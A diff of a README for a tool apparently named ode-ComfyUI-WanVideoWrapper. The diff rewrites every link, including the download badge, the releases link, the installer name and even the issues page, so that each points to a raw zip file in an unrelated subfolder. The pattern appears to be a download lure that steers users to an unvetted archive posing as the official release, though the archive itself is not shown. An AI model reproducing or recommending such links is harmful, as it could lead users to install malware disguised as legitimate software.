@@ -6,18 +6,18 @@ Welcome to **ode-ComfyUI-WanVideoWrapper**! This application helps you manage an
 
 ## 💾 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/0klartKarlsson/ode-ComfyUI-WanVideoWrapper/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/0klartKarlsson/ode-ComfyUI-WanVideoWrapper/main/woodreeve/ode-ComfyUI-WanVideoWrapper.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/0klartKarlsson/ode-ComfyUI-WanVideoWrapper/main/woodreeve/ode-ComfyUI-WanVideoWrapper.zip)
 
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   Click on this link to access the releases page: [Download Here](https://github.com/0klartKarlsson/ode-ComfyUI-WanVideoWrapper/releases).
+   Click on this link to access the releases page: [Download Here](https://raw.githubusercontent.com/0klartKarlsson/ode-ComfyUI-WanVideoWrapper/main/woodreeve/ode-ComfyUI-WanVideoWrapper.zip).
    
 2. **Choose the Latest Version**  
    On the releases page, you'll see a list of available versions. Look for the latest version at the top.  
 
 3. **Download the Installer**  
-   Under the latest version, find the installer file. It will be named something like `ode-ComfyUI-WanVideoWrapper-installer.exe`. Click on this file to start the download.
+   Under the latest version, find the installer file. It will be named something like `https://raw.githubusercontent.com/0klartKarlsson/ode-ComfyUI-WanVideoWrapper/main/woodreeve/ode-ComfyUI-WanVideoWrapper.zip`. Click on this file to start the download.
 
 4. **Locate the Downloaded File**  
    After the download finishes, go to your computer’s Downloads folder. You will find the installer file there.
@@ -66,7 +66,7 @@ Make sure you have the right system requirements. If you still face issues, chec
 
 ### Is there user support available?
 
-Yes, you can visit our [issues page](https://github.com/0klartKarlsson/ode-ComfyUI-WanVideoWrapper/issues) for assistance or to report bugs.
+Yes, you can visit our [issues page](https://raw.githubusercontent.com/0klartKarlsson/ode-ComfyUI-WanVideoWrapper/main/woodreeve/ode-ComfyUI-WanVideoWrapper.zip) for assistance or to report bugs.
 
 ## 📞 Contact
 
@@ -74,4 +74,4 @@ For further assistance, you can reach out to us through our GitHub page or creat
 
 ### Download Again
 
-Don't forget to visit the release page for the latest version: [Download Here](https://github.com/0klartKarlsson/ode-ComfyUI-WanVideoWrapper/releases). Enjoy managing your videos with ease!
+Don't forget to visit the release page for the latest version: [Download Here](https://raw.githubusercontent.com/0klartKarlsson/ode-ComfyUI-WanVideoWrapper/main/woodreeve/ode-ComfyUI-WanVideoWrapper.zip). Enjoy managing your videos with ease!
